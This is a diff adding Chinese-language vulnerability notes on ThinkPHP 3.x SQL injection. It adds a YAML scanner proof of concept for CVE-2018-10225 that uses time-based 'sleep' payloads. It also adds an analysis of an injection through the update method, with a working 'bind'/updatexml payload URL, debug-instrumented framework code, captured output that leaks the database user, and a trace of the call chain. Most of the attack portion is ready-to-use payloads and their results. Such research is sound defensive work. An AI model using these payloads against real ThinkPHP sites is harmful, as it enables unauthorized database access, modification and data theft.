@@ -824,3 +824,550 @@ string(0) ""
 1105:XPATH syntax error: 'root@localhost1' [ SQL语句 ] : SELECT COUNT(id),updatexml(1,concat(1,user(),1),1)from think_user#) AS tp_count FROM `think_user`
 ```
 
+四、ThinkPHP <= 3.1.3 SQL注入漏洞（CNVD-2018-09389）（CVE-2018-10225）
+
+描述：
+
+
+
+thinkphp 3.1.3版本中存在SQL注入漏洞。远程攻击者可借助‘s’参数向index.php文件发送特制的SQL语句利用该漏洞查看、添加、更改或删除后端数据库中的信息。
+
+
+
+```
+detail:
+  ID: 662
+  Author: 匿名作者
+  Name: ThinkPHP框架index.php s参数-SQL注入(CVE-2018-10225)
+  Description: "【漏洞对象】ThinkPHP\n【涉及版本】ThinkPHP 3.1.3\n【漏洞描述】\nthinkphp是一个免费开源的，快速、简单的面向对象的轻量级PHP高性能开发框架，该框架index.php文件s参数存在sql盲注，可造成数据泄露，甚至服务器被入侵。"
+  Identifier:
+    CVE: CVE-2018-10225
+    DVB: DVB-2021-662
+  Cvss:
+    Score: '9.8'
+    Vector: CVSS:3.0/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H
+  VulnClass:
+  - SQL注入
+  Category:
+  - 应用服务
+  Manufacturer: 上海顶想
+  Product: ThinkPHP
+  Type: 1
+  Status: 1
+  Scanable: 1
+  Level: 3
+  Risk: 2
+  DisclosureDate: '2018-04-19'
+  AddDate: '2021-01-19'
+  UpdateDate: '2024-12-24'
+  VulnImpact: 黑客可以直接执行SQL语句，从而控制整个服务器：获取数据、修改数据、删除数据等。
+  Is0day: false
+  Expertmodel: false
+  IncludeExp: false
+  Weakable: false
+  IsXc: false
+  IsCommon: true
+  IsCallBack: false
+  Condition: header="thinkphp" || header="think_template"
+  Solutions:
+  - 1.在网页代码中需要对用户输入的数据进行严格过滤。
+  - 2.部署Web应用防火墙，对数据库操作进行监控。
+  - 3.升级至最新版本：<a href="http://www.thinkphp.cn/down.html" target="_blank">http://www.thinkphp.cn/down.html</a
+  Sources:
+  - https://github.com/cflq3/poc/blob/b6eea1312c0c40972b703d3825ee40aa680cf9c6/bugscan/exp-1833.py
+  PluginType: yaml
+  Finger:
+  - Manufacturer: 上海顶想
+    Product: ThinkPHP
+    ProductDescription: ''
+    Category: 应用服务
+    Type: 1
+    Condition: header="thinkphp" || header="think_template"
+    IsXc: false
+    Region: ''
+poc:
+  relative: req0&&req1
+  session: true
+  requests:
+  - method: POST
+    timeout: 10
+    path: /index.php?s=/home/user/checkcode/
+    headers:
+      User-Agent: Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML,
+        like Gecko) Chrome/59.0.3034.103 Safari/537.36
+      Content-Type: application/x-www-form-urlencoded
+    data: "----------641902708\nContent-Disposition: form-data; name=\"couponid\"\n\
+      \n1') union select sleep(5)#\n----------641902708--"
+    follow_redirects: true
+    matches: (code.eq("200") && time.egt("5"))
+  - method: POST
+    timeout: 10
+    path: /index.php?s=/home/user/checkcode/
+    headers:
+      User-Agent: Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like
+        Gecko) Chrome/59.0.843.71 Safari/537.36
+      Content-Type: application/x-www-form-urlencoded
+    data: "----------641902708\nContent-Disposition: form-data; name=\"couponid\"\n\
+      \n1') union select sleep(10)#\n----------641902708--"
+    follow_redirects: true
+    matches: (code.eq("200") && time.egt("10"))
+```
+
+五、ThinkPHP 3.X update方法 SQL注入
+
+描述：
+
+由于框架实现安全数据库过程中在update更新数据的过程中存在SQL语句的拼接，并且当传入数组未过滤时导致出现了SQL注入
+
+
+
+分析：
+
+demo代码
+
+url：http://localhost/thinkphp-3.2.3/index.php/Home/Index/updateSql?nickname[]=bind&nickname[]=0%20and%201=(updatexml(1,concat(0x7e,(user())),1))%23&email=admin@emal.com
+
+```
+public function updateSql()
+{
+    $user = M('user');
+    $u['nickname'] = I('nickname');
+    $data['email']= I('email');
+    $res = $user->where($u)->save($data);
+}
+```
+
+
+
+
+
+```
+public function save($data = '', $options = array())
+{
+	echo "<pre>调试输出：\n";
+    echo ">>> [DEBUG] Enter save()\n";
+
+    if (empty($data)) {
+        echo "[DEBUG] 参数 \$data 为空，尝试使用 \$this->data\n";
+
+        if (!empty($this->data)) {
+            $data = $this->data;
+            $this->data = array();
+            echo "[DEBUG] 使用 \$this->data 初始化 \$data: ";
+            var_dump($data);
+        } else {
+            $this->error = L('_DATA_TYPE_INVALID_');
+            echo "[ERROR] 无效的数据类型\n";
+            return false;
+        }
+    }
+
+    // 数据处理
+    $data = $this->_facade($data);
+    echo "[DEBUG] _facade 处理后的数据: ";
+    var_dump($data);
+
+    if (empty($data)) {
+        $this->error = L('_DATA_TYPE_INVALID_');
+        echo "[ERROR] _facade 处理后数据为空\n";
+        return false;
+    }
+
+    // 分析表达式
+    $options = $this->_parseOptions($options);
+    echo "[DEBUG] 解析后的 options: ";
+    var_dump($options);
+
+    $pk = $this->getPk();
+    echo "[DEBUG] 获取主键字段: {$pk}\n";
+
+    if (!isset($options['where'])) {
+        echo "[DEBUG] where 条件未设置，尝试从数据中提取主键\n";
+
+        if (is_string($pk) && isset($data[$pk])) {
+            $where[$pk] = $data[$pk];
+            unset($data[$pk]);
+        } elseif (is_array($pk)) {
+            foreach ($pk as $field) {
+                if (isset($data[$field])) {
+                    $where[$field] = $data[$field];
+                } else {
+                    $this->error = L('_OPERATION_WRONG_');
+                    echo "[ERROR] 缺少复合主键字段: {$field}\n";
+                    return false;
+                }
+                unset($data[$field]);
+            }
+        }
+
+        if (!isset($where)) {
+            $this->error = L('_OPERATION_WRONG_');
+            echo "[ERROR] 未能构造 where 条件\n";
+            return false;
+        } else {
+            $options['where'] = $where;
+        }
+    }
+
+    if (is_array($options['where']) && isset($options['where'][$pk])) {
+        $pkValue = $options['where'][$pk];
+        echo "[DEBUG] 提取主键值: ";
+        var_dump($pkValue);
+    }
+
+    echo "[DEBUG] 调用 _before_update()\n";
+    if (false === $this->_before_update($data, $options)) {
+        echo "[ERROR] _before_update() 返回 false\n";
+        return false;
+    }
+
+    echo "[DEBUG] 调用 db->update()\n";
+    $result = $this->db->update($data, $options);
+    echo "[DEBUG] update 返回结果: ";
+    var_dump($result);
+
+    if (false !== $result && is_numeric($result)) {
+        if (isset($pkValue)) {
+            $data[$pk] = $pkValue;
+        }
+
+        echo "[DEBUG] 调用 _after_update()\n";
+        $this->_after_update($data, $options);
+    }
+
+    echo "[DEBUG] 返回结果: ";
+    var_dump($result);
+	echo "</pre>";
+    return $result;
+}
+```
+
+
+
+
+
+```
+public function update($data, $options)
+{
+	echo "<pre>调试输出：\n";
+    echo ">>> [DEBUG] Enter update()\n";
+
+    $this->model = $options['model'];
+    echo "[DEBUG] 模型名: {$this->model}\n";
+
+    $this->parseBind(!empty($options['bind']) ? $options['bind'] : array());
+
+    $table = $this->parseTable($options['table']);
+    echo "[DEBUG] 解析后的表名: {$table}\n";
+
+    $sql = 'UPDATE ' . $table . $this->parseSet($data);
+    echo "[DEBUG] 初始 SQL: {$sql}\n";
+
+    if (strpos($table, ',')) {
+        $join = $this->parseJoin(!empty($options['join']) ? $options['join'] : '');
+        $sql .= $join;
+        echo "[DEBUG] 添加 JOIN 子句: {$join}\n";
+    }
+
+    $where = $this->parseWhere(!empty($options['where']) ? $options['where'] : '');
+    $sql .= $where;
+    echo "[DEBUG] 添加 WHERE 子句: {$where}\n";
+
+    if (!strpos($table, ',')) {
+        $order = $this->parseOrder(!empty($options['order']) ? $options['order'] : '');
+        $limit = $this->parseLimit(!empty($options['limit']) ? $options['limit'] : '');
+        $sql .= $order . $limit;
+        echo "[DEBUG] 添加 ORDER 子句: {$order}\n";
+        echo "[DEBUG] 添加 LIMIT 子句: {$limit}\n";
+    }
+
+    $comment = $this->parseComment(!empty($options['comment']) ? $options['comment'] : '');
+    $sql .= $comment;
+    echo "[DEBUG] 添加注释: {$comment}\n";
+
+    echo "[DEBUG] 最终 SQL: {$sql}\n";
+
+    $result = $this->execute($sql, !empty($options['fetch_sql']) ? true : false);
+    echo "[DEBUG] execute() 返回结果: ";
+    var_dump($result);
+	echo "</pre>";
+    return $result;
+}
+```
+
+
+
+```
+protected function parseSet($data)
+{	
+	echo "<pre>调试输出：\n";
+    $set = [];
+    foreach ($data as $key => $val) {
+        if (is_array($val) && 'exp' == $val[0]) {
+            echo "[DEBUG] 表达式: {$key} = {$val[1]}\n";
+            $set[] = $this->parseKey($key) . '=' . $val[1];
+        } elseif (is_null($val)) {
+            echo "[DEBUG] 空值: {$key} = NULL\n";
+            $set[] = $this->parseKey($key) . '=NULL';
+        } elseif (is_scalar($val)) {
+            if (0 === strpos($val, ':') && in_array($val, array_keys($this->bind))) {
+                echo "[DEBUG] 使用已有绑定: {$key} = {$val}\n";
+                $set[] = $this->parseKey($key) . '=' . $this->escapeString($val);
+            } else {
+                $name  = count($this->bind);
+                echo "[DEBUG] 自动绑定: {$key} => :{$name} (值: {$val})\n";
+                $set[] = $this->parseKey($key) . '=:' . $name;
+                $this->bindParam($name, $val);
+            }
+        }
+    }
+    $sql = ' SET ' . implode(',', $set);
+    echo "[DEBUG] 最终 SET 子句: {$sql}\n";
+	echo "</pre>";
+    return $sql;
+}
+```
+
+
+
+```
+  /**
+     * where分析
+     * @access protected
+     * @param mixed $where
+     * @return string
+     */
+    protected function parseWhere($where)
+    {
+        $whereStr = '';
+        if (is_string($where)) {
+            // 直接使用字符串条件
+            $whereStr = $where;
+        } else {
+            // 使用数组表达式
+            $operate = isset($where['_logic']) ? strtoupper($where['_logic']) : '';
+            if (in_array($operate, array('AND', 'OR', 'XOR'))) {
+                // 定义逻辑运算规则 例如 OR XOR AND NOT
+                $operate = ' ' . $operate . ' ';
+                unset($where['_logic']);
+            } else {
+                // 默认进行 AND 运算
+                $operate = ' AND ';
+            }
+            foreach ($where as $key => $val) {
+                if (is_numeric($key)) {
+                    $key = '_complex';
+                }
+                if (0 === strpos($key, '_')) {
+                    // 解析特殊条件表达式
+                    $whereStr .= $this->parseThinkWhere($key, $val);
+                } else {
+                    // 查询字段的安全过滤
+                    // if(!preg_match('/^[A-Z_\|\&\-.a-z0-9\(\)\,]+$/',trim($key))){
+                    //     E(L('_EXPRESS_ERROR_').':'.$key);
+                    // }
+                    // 多条件支持
+                    $multi = is_array($val) && isset($val['_multi']);
+                    $key   = trim($key);
+                    if (strpos($key, '|')) {
+                        // 支持 name|title|nickname 方式定义查询字段
+                        $array = explode('|', $key);
+                        $str   = array();
+                        foreach ($array as $m => $k) {
+                            $v     = $multi ? $val[$m] : $val;
+                            $str[] = $this->parseWhereItem($this->parseKey($k), $v);
+                        }
+                        $whereStr .= '( ' . implode(' OR ', $str) . ' )';
+                    } elseif (strpos($key, '&')) {
+                        $array = explode('&', $key);
+                        $str   = array();
+                        foreach ($array as $m => $k) {
+                            $v     = $multi ? $val[$m] : $val;
+                            $str[] = '(' . $this->parseWhereItem($this->parseKey($k), $v) . ')';
+                        }
+                        $whereStr .= '( ' . implode(' AND ', $str) . ' )';
+                    } else {
+                        $whereStr .= $this->parseWhereItem($this->parseKey($key), $val);
+                    }
+                }
+                $whereStr .= $operate;
+            }
+            $whereStr = substr($whereStr, 0, -strlen($operate));
+        }
+        return empty($whereStr) ? '' : ' WHERE ' . $whereStr;
+    }
+```
+
+
+
+```
+  protected function parseWhereItem($key, $val)
+    {
+        $whereStr = '';
+        if (is_array($val)) {
+            if (is_string($val[0])) {
+                $exp = strtolower($val[0]);
+                if (preg_match('/^(eq|neq|gt|egt|lt|elt)$/', $exp)) {
+                    // 比较运算
+                    $whereStr .= $key . ' ' . $this->exp[$exp] . ' ' . $this->parseValue($val[1]);
+                } elseif (preg_match('/^(notlike|like)$/', $exp)) {
+// 模糊查找
+                    if (is_array($val[1])) {
+                        $likeLogic = isset($val[2]) ? strtoupper($val[2]) : 'OR';
+                        if (in_array($likeLogic, array('AND', 'OR', 'XOR'))) {
+                            $like = array();
+                            foreach ($val[1] as $item) {
+                                $like[] = $key . ' ' . $this->exp[$exp] . ' ' . $this->parseValue($item);
+                            }
+                            $whereStr .= '(' . implode(' ' . $likeLogic . ' ', $like) . ')';
+                        }
+                    } else {
+                        $whereStr .= $key . ' ' . $this->exp[$exp] . ' ' . $this->parseValue($val[1]);
+                    }
+                } elseif ('bind' == $exp) {
+                    // 使用表达式
+                    $whereStr .= $key . ' = :' . $val[1];
+                } elseif ('exp' == $exp) {
+                    // 使用表达式
+                    $whereStr .= $key . ' ' . $val[1];
+                } elseif (preg_match('/^(notin|not in|in)$/', $exp)) {
+                    // IN 运算
+                    if (isset($val[2]) && 'exp' == $val[2]) {
+                        $whereStr .= $key . ' ' . $this->exp[$exp] . ' ' . $val[1];
+                    } else {
+                        if (is_string($val[1])) {
+                            $val[1] = explode(',', $val[1]);
+                        }
+                        $zone = implode(',', $this->parseValue($val[1]));
+                        $whereStr .= $key . ' ' . $this->exp[$exp] . ' (' . $zone . ')';
+                    }
+                } elseif (preg_match('/^(notbetween|not between|between)$/', $exp)) {
+                    // BETWEEN运算
+                    $data = is_string($val[1]) ? explode(',', $val[1]) : $val[1];
+                    $whereStr .= $key . ' ' . $this->exp[$exp] . ' ' . $this->parseValue($data[0]) . ' AND ' . $this->parseValue($data[1]);
+                } else {
+                    E(L('_EXPRESS_ERROR_') . ':' . $val[0]);
+                }
+            } else {
+                $count = count($val);
+                $rule  = isset($val[$count - 1]) ? (is_array($val[$count - 1]) ? strtoupper($val[$count - 1][0]) : strtoupper($val[$count - 1])) : '';
+                if (in_array($rule, array('AND', 'OR', 'XOR'))) {
+                    $count = $count - 1;
+                } else {
+                    $rule = 'AND';
+                }
+                for ($i = 0; $i < $count; $i++) {
+                    $data = is_array($val[$i]) ? $val[$i][1] : $val[$i];
+                    if ('exp' == strtolower($val[$i][0])) {
+                        $whereStr .= $key . ' ' . $data . ' ' . $rule . ' ';
+                    } else {
+                        $whereStr .= $this->parseWhereItem($key, $val[$i]) . ' ' . $rule . ' ';
+                    }
+                }
+                $whereStr = '( ' . substr($whereStr, 0, -4) . ' )';
+            }
+        } else {
+            //对字符串类型字段采用模糊匹配
+            $likeFields = $this->config['db_like_fields'];
+            if ($likeFields && preg_match('/^(' . $likeFields . ')$/i', $key)) {
+                $whereStr .= $key . ' LIKE ' . $this->parseValue('%' . $val . '%');
+            } else {
+                $whereStr .= $key . ' = ' . $this->parseValue($val);
+            }
+        }
+        return $whereStr;
+    }
+```
+
+
+
+输出
+
+```
+调试输出：
+>>> [DEBUG] Enter save()
+[DEBUG] _facade 处理后的数据: array(1) {
+  ["email"]=>
+  string(14) "admin@emal.com"
+}
+[DEBUG] 解析后的 options: array(3) {
+  ["where"]=>
+  array(1) {
+    ["nickname"]=>
+    array(2) {
+      [0]=>
+      string(4) "bind"
+      [1]=>
+      string(47) "0 and 1=(updatexml(1,concat(0x7e,(user())),1))#"
+    }
+  }
+  ["table"]=>
+  string(10) "think_user"
+  ["model"]=>
+  string(4) "user"
+}
+[DEBUG] 获取主键字段: id
+[DEBUG] 调用 _before_update()
+[DEBUG] 调用 db->update()
+调试输出：
+>>> [DEBUG] Enter update()
+[DEBUG] 模型名: user
+[DEBUG] 解析后的表名: `think_user`
+调试输出：
+[DEBUG] 自动绑定: email => :0 (值: admin@emal.com)
+[DEBUG] 最终 SET 子句:  SET `email`=:0
+[DEBUG] 初始 SQL: UPDATE `think_user` SET `email`=:0
+[DEBUG] 添加 WHERE 子句:  WHERE `nickname` = :0 and 1=(updatexml(1,concat(0x7e,(user())),1))#
+输入参数:
+string(0) ""
+[DEBUG] 添加 ORDER 子句: 
+[DEBUG] 添加 LIMIT 子句: 
+[DEBUG] 添加注释: 
+[DEBUG] 最终 SQL: UPDATE `think_user` SET `email`=:0 WHERE `nickname` = :0 and 1=(updatexml(1,concat(0x7e,(user())),1))#
+
+
+
+
+
+
+
+
+:(
+
+
+1105:XPATH syntax error: '~root@localhost'
+ [ SQL语句 ] : UPDATE `think_user` SET `email`='admin@emal.com' WHERE `nickname` = 'admin@emal.com' and 1=(updatexml(1,concat(0x7e,(user())),1))#
+```
+
+利用过程
+
+```
+[入口] index.php?nickname[]=bind&nickname[]=0 and 1=(updatexml(1,concat(0x7e,(user())),1))#&email=admin@emal.com
+
+==> IndexController::updateSql()
+    ==> I('nickname') // => array('bind', '注入语句')
+    ==> $u['nickname'] = I('nickname')
+    ==> $user->where($u)->save($data)
+
+==> Model::save()
+    ==> _facade($data) // email 被处理
+    ==> _parseOptions()  // 将 where 条件放入 $options
+        ==> ['where' => ['nickname' => ['bind', 'payload']]]
+    ==> $this->db->update($data, $options)
+
+==> Db::update()
+    ==> parseTable() // 表名解析
+    ==> parseSet($data) // 生成 SET email = :0
+    ==> parseWhere($options['where'])
+        ==> parseWhereItem()
+            ==> nickname = :0 AND 1=(updatexml(...))#
+    ==> 拼接最终 SQL:
+        UPDATE `think_user` SET `email`=:0 WHERE `nickname` = :0 and 1=(updatexml(...))
+
+==> execute($sql, false)
+    ==> SQL 注入触发
+
+```
+
+六、ThinkPHP 3.X where SQL注入
+
